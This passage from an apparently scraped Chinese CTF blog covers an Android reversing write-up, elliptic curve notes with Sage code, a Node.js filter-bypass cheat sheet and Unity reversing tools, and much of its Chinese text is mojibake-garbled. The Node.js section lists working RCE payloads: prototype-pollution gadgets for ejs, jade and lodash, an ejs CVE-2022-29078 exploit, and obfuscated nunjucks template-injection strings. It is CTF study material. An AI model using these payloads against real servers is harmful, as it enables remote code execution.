secret[20-i]=ans[20-i]^(i+1) secret[10]=ans[10]print(bytes(secret))#Android_scheme_is_FUN å¾—åˆ°çš„åªæ˜¯secretéƒ¨åˆ†ï¼Œéœ€æäº¤dataï¼Œ æ³¨æ„åˆ°paramBundle=getIntent().getData()ä¸”paramBundleå…·æœ‰getScheme()å’ŒgetHost()æ–¹æ³•ï¼Œäº†è§£çŸ¥ä¸ºAndroidä¸šåŠ¡ç»„ä»¶URL Schemeï¼Œåˆ°AndroidManifest.xmlä¸­æŸ¥çœ‹ï¼Œå‘ç° &lt;data android:host=&quot;p4th&quot; android:path=&quot;/70/1nput android:scheme=&quot;sh0w&quot;&gt; æ„é€ å‡ºé“¾æ¥&lt;a href=&quot;sh0w://p4th/70/1nput?secret=Android_scheme_is_FUN&quot;&gt;æ‰“å¼€APP&lt;/a&gt;ï¼Œè°ƒè¯•å‡ºflagã€‚ â€‹ warmupIDAåˆ†æï¼Œè¾“å…¥flagé•¿åº¦ä¸º48ï¼Œå†æŠŠbyte_40A0æ•°ç»„ä¸­çš„0xFFä¾æ¬¡æ›¿æ¢ä¸º48ä¸ªå€¼ï¼Œæœ€å16Ã—16çŸ©é˜µæ£€æµ‹æ¯è¡Œã€æ¯åˆ—ä»¥åŠæ¯ä¸ª4Ã—4å—æ˜¯å¦æ»¡è¶³0-15å…±16ä¸ªå€¼ã€‚ åŸå§‹byte_40A0æ•°ç»„ï¼š 1234567891011121314151608 0E FF 0C 09 0D FF 01 0A 0F 03 0B 00 02 FF 0401 06 03 02 05 0A 07 00 08 09 FF 04 0F 0E 0B 0D0A 00 FF 0D 04 0F 03 0B 07 05 0E 02 06 08 0C 0104 0B 05 0F FF 02 FF 0C 06 0D 01 00 FF 0A 03 0902 0A FF 03 0D 00 0B 05 0C FF 09 01 FF 0F 07 0E0D 07 0C 0B 0F 0E 0A 08 00 FF 05 03 09 06 01 02FF 01 0F FF 0C 09 04 06 02 0E 0D FF FF 03 0A FF09 04 06 0E 02 07 01 03 0B 08 0A 0F 05 FF 00 0CFF 03 0A 07 0E 08 0C 04 09 FF 00 0D 02 FF 06 FF0C 09 01 FF 0B 03 0F 0D 0E 0A FF FF 08 00 04 0706 0D 00 08 0A 01 02 FF FF 07 04 05 0C 0B FF 0F0B 02 0E FF 00 FF 05 FF 0F 01 FF 0C 0A 09 0D 03FF 0F 0B FF 03 0C FF 0E 05 FF FF 09 FF 04 08 0A0E 08 FF FF 07 05 0D 0F 04 03 FF FF 01 0C 09 00FF 05 0D 09 06 04 08 0A 01 0C 0F 0E FF 07 02 0B03 FF 04 0A FF 0B 09 02 0D 00 FF 08 0E FF 0F 06 ä»å‰é¢ä»£ç é€»è¾‘æ¨æµ‹ä¸ºåå…­å®«æ ¼å¡«å……ï¼Œ0xFFä¸ºéœ€è¦å¡«å……çš„æ•°å­—ï¼Œå¡«å…¥åé€ä¸ªå–å‡ºå³ä¸ºflagã€‚ åˆ©ç”¨excelï¼Œå¡«å……ç»“æœï¼š é€ä¸ªå–å‡ºï¼š 12345678910111213x =[7, 6, 5, 12, 9, 8, 14, 7, 8, 6, 4, 4, 5, 0, 7, 11, 8, 13, 15, 11, 1, 5, 5, 2, 6, 9, 3, 14, 4, 6, 7, 8, 7, 1, 0, 2, 6, 13, 2, 6, 11, 10, 0, 3, 12, 1, 7, 5]flag=&#x27;&#x27;for k in x: if k+48&gt;47 and k+48&lt;=57: flag+=chr(k+48) elif k+87&gt;96 and k+87&lt;=102: flag+=chr(k+87) else: flag+=&#x27;?&#x27; print(flag)","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021èµ›","slug":"2021èµ›","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"æ›²çº¿","slug":"crypto-æ›²çº¿","date":"2021-01-20T12:17:07.000Z","updated":"2023-10-25T17:44:39.495Z","comments":true,"path":"2021/01/20/crypto-æ›²çº¿/","permalink":"https://lazzzaro.github.io/2021/01/20/crypto-%E6%9B%B2%E7%BA%BF/","excerpt":"","text":"â€‹ æ•°æ®åº“ï¼š https://www.hyperelliptic.org/EFD/ https://safecurves.cr.yp.to/equation.html åˆ¤æ®å•ä½å…ƒ $O$ï¼š$O+Q=Q$ =&gt; $(0,0)+(x_1,y_1)=(x_1,y_1)$ é€†å…ƒ $-Q$ï¼š$(-Q)+Q=0$ =&gt; $(x_1,y_1)+(x_2,y_2)=(0,0)$ æ˜ å°„å‰åæ›²çº¿çš„é˜¶ä¸å˜ã€‚ â€‹ å¸¸è§æ›²çº¿Edwards Curvesä¸€èˆ¬æ–¹ç¨‹ï¼š $x^2+y^2=c^2(1+dx^2y^2)$ å˜æ¢ï¼š$\\Big(\\cfrac{X}{c}\\Big)^2+\\Big(\\cfrac{Y}{c}\\Big)^2=1+Dc^4\\Big(\\cfrac{X}{c}\\Big)^2\\Big(\\cfrac{Y}{c}\\Big)^2 \\Rightarrow X^2+Y^2=1+DX^2Y^2$ åŠ æ³•ï¼š $(x_1,y_1)+(x_2,y_2)=\\Big(\\cfrac{x_1y_2+y_1x_2}{c(1+dx_1x_2y_1y_2)},\\cfrac{y_1y_2-x_1x_2}{c(1-dx_1x_2y_1y_2)}\\Big)$ å€ä¹˜ï¼š $2(x_1,y_1)=\\Big(\\cfrac{2x_1y_1}{c(1+dx_1^2y_1^2)},\\cfrac{y_1^2-x_1^2}{c(1-dx_1^2y_1^2)}\\Big)$ å–åï¼š $-(x_1,y_1)=(-x_1,y_1)$ æ˜ å°„ï¼š $x^2+y^2=1+dx^2y^2 \\longmapsto Bv^2=u^3+Au^2+u$ å…¶ä¸­ï¼š $u=\\cfrac{1+y}{1-y},v=\\cfrac{2(1+y)}{x(1-y)}=\\cfrac{2u}{x}$ $A=\\cfrac{4}{1-d}-2,B=\\cfrac{1}{1-d}$ å‚è€ƒï¼š https://safecurves.cr.yp.to/equation.html Crypto CTF 2021 - RoHaLd â€‹ Twisted Edwards Curvesä¸€èˆ¬æ–¹ç¨‹ï¼š $ax^2+y^2=c^2(1+dx^2y^2)$ å˜æ¢ï¼š$a\\Big(\\cfrac{X}{c}\\Big)^2+\\Big(\\cfrac{Y}{c}\\Big)^2=1+Dc^4\\Big(\\cfrac{X}{c}\\Big)^2\\Big(\\cfrac{Y}{c}\\Big)^2 \\Rightarrow AX^2+Y^2=1+DX^2Y^2$ åŠ æ³•ï¼š $(x_1,y_1)+(x_2,y_2)=\\Big(\\cfrac{x_1y_2+y_1x_2}{1+dx_1x_2y_1y_2},\\cfrac{y_1y_2-ax_1x_2}{1-dx_1x_2y_1y_2}\\Big)$ å€ä¹˜ï¼š $2(x_1,y_1)=\\Big(\\cfrac{2x_1y_1}{1+dx_1^2y_1^2},\\cfrac{y_1^2-ax_1^2}{1-dx_1^2y_1^2}\\Big)$ å–åï¼š $-(x_1,y_1)=(-x_1,y_1)$ æ˜ å°„ï¼š $ax^2+y^2=1+dx^2y^2 \\longmapsto Bv^2=u^3+Au^2+u$ å…¶ä¸­ï¼š $u=\\cfrac{1+y}{1-y},v=\\cfrac{1+y}{x(1-y)}=\\cfrac{u}{x}$ $A=\\cfrac{2(a+d)}{a-d},B=\\cfrac{4}{a-d}$ å‚è€ƒï¼š Twisted Edwards Curves NCTF 2022 - superecc â€‹ Binary Edwards Curvesä¸€èˆ¬æ–¹ç¨‹ï¼š $d_1(x+y)+d_2(x^2+y^2)=(x+x^2)(y+y^2)$ åŠ æ³•ï¼š $(x_1,y_1)+(x_2,y_2)=\\Big(\\cfrac{d_1(x_1+x_2)+d_2(x_1+y_1)(x_2+y_2)+(x_1+x_1^2)[x_2(y_1+y_2+1)+y_1y_2]}{d_1+(x_1+x_1^2)(x_2+y_2)},\\cfrac{d_1(y_1+y_2)+d_2(x_1+y_1)(x_2+y_2)+(y_1+y_1^2)[y_2(x_1+x_2+1)+x_1x_2]}{d_1+(y_1+y_1^2)(x_2+y_2)}\\Big)$ å€ä¹˜ï¼š $2(x_1,y_1)=\\Big(\\cfrac{2d_1x_1+d_2(x_1+y_1)^2+(x_1+x_1^2)[x_1(2y_1+1)+y_1^2]}{d_1+(x_1+x_1^2)(x_1+y_1)},\\cfrac{2d_1y_1+d_2(x_1+y_1)^2+(y_1+y_1^2)[y_1(2x_1+1)+x_1^2]}{d_1+(y_1+y_1^2)(x_1+y_1)}\\Big)$ å–åï¼š $-(x_1,y_1)=(y_1,x_1)$ æ˜ å°„ï¼š $v^2+uv=u^3+(d_1^2+d_2)u^2+d_1^4(d_1^4+d_1^2+d_2^2)$ å…¶ä¸­ $u=\\cfrac{d_1(d_1^2+d_1+d_2)(x+y)}{xy+d_1(x+y)}$ $v=d_1(d_1^2+d_1+d_2)\\Big(\\cfrac{x}{xy+d_1(x+y)}+d_1+1\\Big)$ å‚è€ƒï¼š Binary Edwards Curves â€‹ Huff Curveä¸€èˆ¬æ–¹ç¨‹ï¼š $x(ay^2-1)=y(bx^2-1)$ åŠ æ³•ï¼š $(x_1,y_1)+(x_2,y_2)=\\Big(\\cfrac{(x_1+x_2)(1+ay_1y_2)}{(1+bx_1x_2)(1-ay_1y_2)},\\cfrac{(y_1+y_2)(1+bx_1x_2)}{(1-bx_1x_2)(1+ay_1y_2)}\\Big)$ å€ä¹˜ï¼š $2(x_1,y_1)=\\Big(\\cfrac{2x_1(1+ay_1^2)}{(1+bx_1^2)(1-ay_1^2)},\\cfrac{2y_1(1+bx_1^2)}{(1-bx_1^2)(1+ay_1^2)}\\Big)$ å–åï¼š $-(x_1,y_1)=(x_1,y_1)$ æ˜ å°„ï¼š $x(ay^2-1)=y(bx^2-1) \\longmapsto v^2=u^3+Au^2+Bu$ å…¶ä¸­ï¼š $u=\\cfrac{bx-ay}{y-x},v=\\cfrac{b-a}{y-x}$ $A=a+b,B=ab$ å‚è€ƒï¼š 2023 DASCTF CBCTF - CB curve â€‹ æ¨¡æ¿ç±»12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788# Sage# y^2 = ax^2 - bx (mod p)from Crypto.Util.number import inverse, bytes_to_long, long_to_bytesfrom sage.groups.generic import bsgsfrom hashlib import md5class SpecialCurve: def __init__(self, p, a, b): self.p = p self.a = a self.b = b def __str__(self): return f&#x27;SpecialCurve(&#123;self.p&#125;,&#123;self.a&#125;,&#123;self.b&#125;)&#x27; def __call__(self, x, y): return SpecialCurvePoint(self.p, self.a, self.b, x, y) def __contains__(self, other): x, y = other.x, other.y return (self.a * x ** 2 - self.b * x - y ** 2) % self.p == 0class SpecialCurvePoint: def __init__(self, p, a, b, x, y): self.p = p self.a = a self.b = b self.x = x % p self.y = y % p def __str__(self): return &quot;(%d, %d)&quot; % (self.x, self.y) def __repr__(self): return str(self) def __add__(self, P1): x1, y1 = self.x, self.y x2, y2 = P1.x, P1.y if x1 == 0: return P1 elif x2 == 0: return self elif x1 == x2 and (y1+y2) % self.p == 0: return SpecialCurvePoint(self.p, self.a, self.b, 0, 0) if self == P1: t = (2*self.a*x1-self.b)*inverse(2*y1, self.p) % self.p else: t = (y2-y1)*inverse(x2-x1, self.p) % self.p x3 = self.b*inverse(self.a-t**2, self.p) % self.p y3 = x3*t % self.p return SpecialCurvePoint(self.p, self.a, self.b, x3, y3) def __mul__(self, k): assert k &gt;= 0 Q = SpecialCurvePoint(self.p, self.a, self.b, 0, 0) P = SpecialCurvePoint(self.p, self.a, self.b, self.x, self.y) cnt = 0 now = 1 while k &gt; 0: if k % 2: k -= 1 Q = P + Q cnt += now else: k //= 2 P = P + P now *= 2 return Q def order(self): return self.p + 1 def is_zero(self): return self.x == 0 and self.other == 0 def __eq__(self, other): return self.a == other.a and self.b == other.b and self.p == other.p and self.x == other.x and self.y == other.y def __hash__(self): return int(md5((&quot;%d-%d-%d-%d-%d&quot; % (self.p, self.a, self.b, self.x, self.y)).encode()).hexdigest(), 16)def invert(P): return SpecialCurvePoint(P.p, P.a, P.b, P.x, -P.y % P.p)def add(P1, P2): return P1 + P2 â€‹ å¸¸ç”¨ç®—æ³•è®¡ç®—æ›²çº¿æ–¹ç¨‹ï¼š $(x_1,y1)=(x_2,y_2)$ æƒ…å†µä¸‹çš„æ–œç‡ $k=fâ€™(x)$ï¼Œé€†æ¨ $f(x)+C$ï¼Œæ ¹æ®å·²çŸ¥ç‚¹ç¡®å®š $C$ å€¼ã€‚ â€‹ å¤§æ­¥å°æ­¥ç®—æ³•ï¼ˆBSGSç®—æ³•ï¼‰è®¡ç®—ç¦»æ•£å¯¹æ•°ï¼Œå¥—ç”¨sagemathä¸­è‡ªå¸¦çš„bsgsã€‚ sageè‡ªå¸¦çš„bsgsç®—æ³•æœ‰bugï¼Œæ–‡ä»¶ /opt/sagemath-9.3/local/lib/python3.7/site-packages/sage/groups/generic.py ä¸­468è¡Œæ²¡å†™å…¨ï¼Œè¿™å¯¼è‡´bsgsè‡ªå®šä¹‰ç¾¤çš„è®¡ç®—æŠ¥é”™ï¼Œè§£å†³æ–¹æ¡ˆå°±æ˜¯æŠŠè¿™ä¸€è¡Œå‚æ•°è¡¥å…¨å³å¯ã€‚ c = op(inverse(b), multiple(a, lb, operation=operation, identity=identity, inverse=inverse, op=op)) 123456789101112131415curve =G =Q =p = E = curve(0, 0)order = p + 1factors = [..]ans = []for factor in factors: this = bsgs(G * (order // factor), Q * (order // factor), (0, factor), operation=&#x27;other&#x27;, op=add, inverse=invert, identity=E) ans.append(this) print(this)k = crt(ans, factors) â€‹ Pohlig-Hellmanç®—æ³•é€‚ç”¨æƒ…å†µï¼šæ›²çº¿çš„é˜¶å…‰æ»‘ã€‚ æœ‰äº›æ—¶å€™ï¼Œå°½ç®¡BSGSèƒ½å¤Ÿå°†å¤æ‚åº¦é™è‡³ $\\sqrt{p}$ï¼Œä½†æ˜¯è¿™ä¸ªæ•°ä¾ç„¶å¾ˆå¤§ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨ã€‚è¿™æ—¶å¯ä»¥è€ƒè™‘Pohlig-hellmanæ–¹æ³•èƒ½ä¸èƒ½èµ·ä½œç”¨ã€‚ 1234567891011121314151617181920212223242526272829303132def bsgs(g, y, p): m = int(ceil(sqrt(p - 1))) S = &#123;&#125; point = (u,0) for i in range(m): point = point + g pointg = point[0] &lt;&lt; 800 | point[1] S[pointg] = i gs = m * g for i in range(m): pointy = y[0] &lt;&lt; 800 | y[1] if pointy in S: return S[pointy] - i * m + 1 y = y + gs return Nonedef Pohlig_Hellman(G,P): ea = [] na = [] for i in range(len(fac)): c = fac[i] n = (p - 1) // c gi = n * G yi = n * P ei = bsgs(gi,yi,c) ea.append(ei%c) na.append(c) ee = crt(ea,na) return eee = Pohlig_Hellman(G,P) â€‹ å…¶ä»–æ˜ å°„Montgomeryå‹ -&gt; Weierstrasså‹ $By^2=x^3+Ax^2+x \\longmapsto v^2=u^3+au+b$ å…¶ä¸­ï¼š $(x,y) \\longmapsto (u,v)=\\Big(\\cfrac{x}{B}+\\cfrac{A}{3B},\\cfrac{y}{B}\\Big)$ $a=\\cfrac{3-A^2}{3B^2},b=\\cfrac{2A^3-9A}{27B^3}$ å‚è€ƒï¼šMontgomery curve â€‹ $x^2 - Dy^2 = k^2$ å‹ å°†æ›²çº¿ä¸Šçš„DLPé—®é¢˜è½¬åŒ–ä¸ºæ¨¡pçš„DLPé—®é¢˜ æ€§è´¨ï¼š æ»¡è¶³ $(p+1)G=(1,0)$ï¼Œé˜¶ä¸º $p+1$ã€‚ æ›²çº¿å…¶å®æ˜¯ä¸€ä¸ª $\\text{GF}(p)$ ä¸Šçš„pellæ–¹ç¨‹ï¼Œè€Œpellæ–¹ç¨‹çš„è§£å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•å¾—åˆ°ï¼š $x_i+y_i\\sqrt{n}=(x_1+y_1\\sqrt{n})^i$ æˆ–é€’æ¨å…³ç³»å¼ï¼š $\\begin{cases} x_{i+1}=x_1x_i+ny_1y_i \\newline y_{i+1}=x_1y_i+y_1x_i \\end{cases}$ å¯¹çŸ©é˜µ $\\begin{bmatrix} x_1 &amp; Dy_1 \\ y_1 &amp; x_1\\end{bmatrix}$ è¿›è¡Œå¯¹è§’åŒ–ï¼Œå¯ä»¥å¾—åˆ°å…¶ç‰¹å¾å€¼ä¸º $Dy+x,-Dy+x$ï¼Œä¹‹åæ±‚å¾— $x_n = \\cfrac{(y_1\\sqrt D + x_1)^n + (-y_1\\sqrt D + x_1)^n}{2 u^{n-1}}, y_n = \\cfrac{(y_1\\sqrt D + x_1)^n - (-y_1\\sqrt D + x_1)^n}{2 \\sqrt Du^{n-1}}$ å®¹æ˜“å¾—åˆ° $\\cfrac{x_n - \\sqrt D y_n}{ u} = \\Big(\\cfrac{x_1 - \\sqrt D y_1}{u} \\Big) ^ n, \\cfrac{x_n + \\sqrt D y_n}{ u} = \\Big(\\cfrac{x_1 + \\sqrt D y_1}{u}\\Big) ^ n$ å³æ‰¾åˆ°äº†ä¸¤ä¸ªå°†æ›²çº¿ä¸Šç‚¹æ˜ å°„åˆ° GF çš„æ˜ å°„ $f: f(x, y) = \\cfrac{x - \\sqrt D y}{ u}, g: g(x, y) = \\cfrac{x + \\sqrt D y}{ u}$ æ­¤æ—¶ï¼Œåˆ©ç”¨hackergame2020çš„OTä¸­çš„æŠ€å·§ï¼Œä¸” $D$ å·²çŸ¥ï¼Œå¯¹äºæ¯ä¸€ä¸ªç‚¹ï¼Œå¯ä»¥å¾—åˆ° $x - \\sqrt D y$ï¼Œå¾—åˆ°ä¸¤ç»„æ•°æ®åç›¸é™¤ï¼Œå³å¯å¾—åˆ° $\\cfrac{x_{1n} + \\sqrt D y_{1n}}{ x_{2n} + \\sqrt D y_{2n}} = \\Big(\\cfrac{x_1 + \\sqrt D y_1}{x_2 + \\sqrt D y_2}\\Big) ^ n$ å¯¹è¿™ä¸¤ä¸ªæ•°é€šè¿‡Pohlig Hellmanç®—æ³•æ±‚DLPï¼Œå³å¯å¾—åˆ° $e$ã€‚ å‚è€ƒï¼š DUCTF 2021 - yadlp D^3CTF 2021 - EasyCurve SUSCTF 2022 - SpecialCurve3","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"æ›²çº¿","slug":"æ›²çº¿","permalink":"https://lazzzaro.github.io/tags/%E6%9B%B2%E7%BA%BF/"}],"author":"Lazzaro"},{"title":"node.jsç»•è¿‡","slug":"web-node-jsç»•è¿‡","date":"2020-12-20T17:07:23.000Z","updated":"2023-11-03T16:31:55.150Z","comments":true,"path":"2020/12/21/web-node-jsç»•è¿‡/","permalink":"https://lazzzaro.github.io/2020/12/21/web-node-js%E7%BB%95%E8%BF%87/","excerpt":"","text":"â€‹ req.body =&gt; POST/PUTè¯·æ±‚ req.params =&gt; ç±»ä¼¼ /api/getUserListById/:id è·¯ç”±ï¼Œå¦‚ http://localhost:3000/giraffe/1 req.query =&gt; GETè¯·æ±‚ï¼Œå¦‚ http://localhost:3000/animals?page=10 â€‹ ç»•è¿‡toUpperCase() / toLowerCase() ç‰¹æ®Šå­—ç¬¦ &#39;Ä±&#39;.toUpperCase()=&#39;I&#39;ï¼Œ&#39;Å¿&#39;.toUpperCase()=&#39;S&#39;ï¼Œ&#39;â„ª&#39;.toLowerCase()=&#39;k&#39; â€‹ å‘½ä»¤æ‰§è¡Œ (RCE)12Object.values(require(&#x27;child_process&#x27;))[5](&#x27;cat$&#123;IFS&#125;/G*&gt;p&#x27;)require(&#x27;child_process&#x27;).spawnSync(&#x27;nl&#x27;,[&#x27;p&#x27;]).stdout.toString() ç»•è¿‡å…³é”®è¯obj.constructorï¼šobj[&quot;constr&quot;+&quot;uctor&quot;]ï¼Œobj[&quot;constru&quot;.concat(&quot;ctor&quot;)]ï¼ŒString.fromCharCode(xxx) thisï¼ševal(&quot;th&quot;+&quot;is&quot;) __proto__ï¼šconstructor.prototype â€‹ åŸå‹é“¾æ±¡æŸ“åŸç†å¯¹äºè¯­å¥ object[a][b] = value å¦‚æœå¯ä»¥æ§åˆ¶a, b, valueçš„å€¼ï¼Œå°†aè®¾ç½®ä¸º __proto__ï¼Œ å°±å¯ä»¥ç»™objectå¯¹è±¡çš„åŸå‹è®¾ç½®ä¸€ä¸ªbå±æ€§ï¼Œå€¼ä¸ºvalueï¼Œè¿™æ ·æ‰€æœ‰ç»§æ‰¿objectå¯¹è±¡åŸå‹çš„å®ä¾‹å¯¹è±¡ä¼šåœ¨æœ¬èº«ä¸æ‹¥æœ‰bå±æ€§çš„æƒ…å†µä¸‹ï¼Œéƒ½ä¼šæ‹¥æœ‰bå±æ€§ï¼Œä¸”å€¼ä¸ºvalueã€‚ å¸¸ç”¨æ±¡æŸ“å‡½æ•°merge() 123456789function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125; clone() 123function clone(obj) &#123; return merge(&#123;&#125;, obj);&#125; copy() 123456789function copy(object1, object2)&#123; for (let key in object2) &#123; if (key in object2 &amp;&amp; key in object1) &#123; copy(object1[key], object2[key]) &#125; else &#123; object1[key] = object2[key] &#125; &#125;&#125; å¸¸è§æ¨¡æ¿å¼•æ“ejs1234567891011121314151617&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;); //&quot;&#125;&#125;&#125;&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;__tmp1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;); __tmp2&quot;&#125;&#125;&#125;&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;);&quot;,&quot;compileDebug&quot;:true&#125;&#125;&#125;&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;);&quot;,&quot;compileDebug&quot;:true,&quot;debug&quot;:true&#125;&#125;&#125;SSTI&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;) %&gt;CVE-2022-29078ï¼ˆejs &lt;= v3.1.9ï¼‰å‚è€ƒï¼šhttps://inhann.top/2023/03/26/ejs/EXP:?settings[view%20options][escapeFunction]=console.log;this.global.process.mainModule.require(%27child_process%27).execSync(&quot;touch /tmp/3.txt&quot;);&amp;settings[view%20options][client]=truePOC:&#123;&quot;settings&quot;:&#123;&quot;view options&quot;:&#123;&quot;escapeFunction&quot;:&quot;console.log;this.global.process.mainModule.require(\\&quot;child_process\\&quot;).execSync(\\&quot;touch /tmp/pwned\\&quot;);&quot;,&quot;client&quot;:&quot;true&quot;&#125;&#125;&#125; jade1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Code&quot;,&quot;compileDebug&quot;:true,&quot;self&quot;:true,&quot;line&quot;:&quot;0, \\&quot;\\&quot; ));return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);//&quot;&#125;&#125;&#125; lodash1&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\\u000aglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;dir&#x27;,function()&#123;&#125;);&quot;&#125;&#125; nunjucks1234567891011&#123;&#123;range.constructor(&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;)()&#125;&#125;&#123;&#123;range.constructor(&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;ls /&#x27;).toString()&quot;)()&#125;&#125;&#123;&#123;&#x27;string&#x27;.toString.constructor(&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;)()&#125;&#125;&#123;&#123;&#x27;string&#x27;.constructor.constructor(&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;)()&#125;&#125;ç»•è¿‡ï¼šï¼ˆä½¿ç”¨unicodeç¼–ç å’Œ`+`å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡å…³é”®å­—çš„è¿‡æ»¤ï¼Œç”¨ `[]` æ¥ç»•è¿‡ `.`ï¼‰&#123;&#123;&quot;string&quot;[&quot;toSt&quot;+&quot;ring&quot;][&quot;const&quot;+&quot;ructor&quot;](&quot;return(global[\\&quot;\\\\u0070\\\\u0072\\\\u006f\\\\u0063\\\\u0065\\\\u0073\\\\u0073\\&quot;][\\&quot;\\\\u006d\\\\u0061\\\\u0069\\\\u006e\\\\u004d\\\\u006f\\\\u0064\\\\u0075\\\\u006c\\\\u0065\\&quot;][\\&quot;\\\\u0072\\\\u0065\\\\u0071\\\\u0075\\\\u0069\\\\u0072\\\\u0065\\&quot;](\\&quot;\\\\u0063\\\\u0068\\\\u0069\\\\u006c\\\\u0064\\\\u005f\\\\u0070\\\\u0072\\\\u006f\\\\u0063\\\\u0065\\\\u0073\\\\u0073\\&quot;)[\\&quot;\\\\u0065\\\\u0078\\\\u0065\\\\u0063\\\\u0053\\\\u0079\\\\u006e\\\\u0063\\&quot;](\\&quot;id\\&quot;)[\\&quot;\\\\u0074\\\\u006f\\\\u0053\\\\u0074\\\\u0072\\\\u0069\\\\u006e\\\\u0067\\&quot;]())&quot;)()&#125;&#125;","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"node.js","slug":"node-js","permalink":"https://lazzzaro.github.io/tags/node-js/"},{"name":"ç»•è¿‡","slug":"ç»•è¿‡","permalink":"https://lazzzaro.github.io/tags/%E7%BB%95%E8%BF%87/"}],"author":"Lazzaro"},{"title":"Unityé€†å‘","slug":"reverse-Unityé€†å‘","date":"2020-12-13T12:28:32.000Z","updated":"2021-04-13T17:08:18.357Z","comments":true,"path":"2020/12/13/reverse-Unityé€†å‘/","permalink":"https://lazzzaro.github.io/2020/12/13/reverse-Unity%E9%80%86%E5%90%91/","excerpt":"","text":"â€‹ å·¥å…· Unity Dllé€†å‘ ä¸€èˆ¬çš„ Unity3D æ¸¸æˆçš„ä¸»é€»è¾‘éƒ½åœ¨ Assembly-CSarp.dll ä¸­ï¼Œæ‰€ä»¥éœ€è¦ dllæ–‡ä»¶é€†å‘/é‡æ–°æ‰“åŒ… å·¥å…·ã€‚Unity3Då¼€å‘çš„æ¸¸æˆï¼Œå…¶æ ¸å¿ƒä»£ç éƒ½åœ¨è¿™ä¸ª dll æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥é€†å‘/ä¿®æ”¹è¿™ä¸ª dll æ–‡ä»¶å°±å¯ä»¥äº†ã€‚ ILSpy ç”¨äºæŸ¥çœ‹dllç¨‹åºé€»è¾‘ã€‚ ILDASM ç”¨äºåç¼–è¯‘dllæ–‡ä»¶ï¼Œç”Ÿæˆilæ–‡ä»¶(å­˜æ”¾äº†dllåç¼–è¯‘åçš„æŒ‡ä»¤)å’Œresæ–‡ä»¶(åç¼–è¯‘åçš„èµ„æºæ–‡ä»¶)ï¼Œå¯ä»¥å®‰è£…Windows SDKæˆ–è€…ä»ç½‘ä¸Šä¸‹è½½ã€‚ ilasm .NET4.0è‡ªå¸¦ï¼Œä½ç½®åœ¨ C:\\Windows\\Microsofr.NET\\Framework\\v4.0.30319\\ilasm.exeã€‚ Unity il2cppé€†å‘ Unity ç¨‹åºä¸ºäº†é˜²æ­¢å¤§é‡çš„å¤–æŒ‚å’Œç›—ç‰ˆæ¸¸æˆï¼Œæ¨å‡ºäº†ä¸€ç§ il2cpp çš„æ“ä½œï¼Œå¤§æ¦‚å°±æ˜¯è®© C# çš„ä¸­é—´ä»£ç  IL è½¬æ¢æˆ C++ æ¥ç¼–è¯‘ï¼Œæœ€åç”Ÿæˆæ±‡ç¼–ç¨‹åºä½¿å¾—åç¼–è¯‘éš¾åº¦å¤§å¤§å¢åŠ ã€‚ Il2CppDumper è¿˜åŸDLLæ–‡ä»¶ï¼ˆä¸åŒ…å«ä»£ç ï¼‰ï¼Œå¯ç”¨äºæå–MonoBehaviourå’ŒMonoScript ä½¿ç”¨æ–¹æ³• ç›´æ¥è¿è¡ŒIl2CppDumper.exeå¹¶ä¾æ¬¡é€‰æ‹©il2cppçš„å¯æ‰§è¡Œæ–‡ä»¶å’Œglobal-metadata.datæ–‡ä»¶ï¼Œç„¶åæ ¹æ®æç¤ºè¾“å…¥ç›¸åº”ä¿¡æ¯ã€‚ç¨‹åºè¿è¡Œå®Œæˆåå°†åœ¨å½“å‰è¿è¡Œç›®å½•ä¸‹ç”Ÿæˆè¾“å‡ºæ–‡ä»¶ã€‚ å‘½ä»¤ Il2CppDumper.exe &lt;executable-file&gt; &lt;global-metadata&gt; &lt;output-directory&gt; è¾“å‡ºæ–‡ä»¶ DummyDll 